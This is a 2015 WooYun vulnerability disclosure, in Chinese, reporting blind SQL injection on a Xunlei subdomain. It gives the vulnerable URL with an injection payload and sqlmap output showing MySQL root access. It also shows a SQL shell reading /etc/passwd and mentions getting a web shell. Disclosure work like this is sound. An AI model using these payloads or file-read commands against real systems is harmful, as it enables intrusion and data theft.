wybug_title: 迅雷某站mysql root权限注入漏洞
wybug_detail: 漏洞详情 披露状态：   									2015-04-14：	细节已通知厂商并且等待厂商处理中									2015-04-14：	厂商已经确认，细节仅向厂商公开									2015-04-24：	细节向核心白帽子及相关领域专家公开									2015-05-04：	细节向普通白帽子公开									2015-05-14：	细节向实习白帽子公开									2015-05-29：	细节向公众公开  简要描述： rt 详细说明：  sjzhushou.com通过whois查询是迅雷的域名：域名sjzhushou.com的注册信息  以下信息获取时间：2015-04-13 22:22:04 获取最新信息所有者	Xunlei Networking Technologies,Ltd.Registrant Name	 所有者联系邮箱	wkn@sandai.netRegistrant E-mail注入点：http://m.sjzhushou.com/cgi-bin/baidureci?tab=movie' and length(user())>10 and '1'='1&timestamp=1428930322113	mysql 布尔盲注   漏洞证明：  当前用户：sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: tab    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: tab=movie' AND 6164=6164 AND 'uxts'='uxts&timestamp=1428930322113---[22:23:39] [INFO] testing MySQL[22:23:39] [INFO] confirming MySQL[22:23:39] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL >= 5.0.0[22:23:39] [INFO] fetching current user[22:23:39] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[22:23:39] [INFO] retrieved: root@10.1.1.93current user:    'root@10.1.1.93'root权限，可以直接load_fileParameter: tab    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: tab=movie' AND 6164=6164 AND 'uxts'='uxts&timestamp=1428930322113    Vector: AND [INFERENCE]---[22:25:11] [INFO] testing MySQL[22:25:11] [INFO] confirming MySQL[22:25:11] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL >= 5.0.0[22:25:11] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTERsql-shell> select load_file('/etc/passwd')[22:25:13] [INFO] fetching SQL SELECT statement query output: 'select load_file('/etc/passwd')'[22:25:13] [INFO] resuming partial value: root:x:0:0:root:/root:/bin如果有web路径的话可以尝试getshell，盲注没耐心寻找路径了，点到为止咯   修复方案：  你懂   版权声明：转载请注明来源 路人甲@乌云
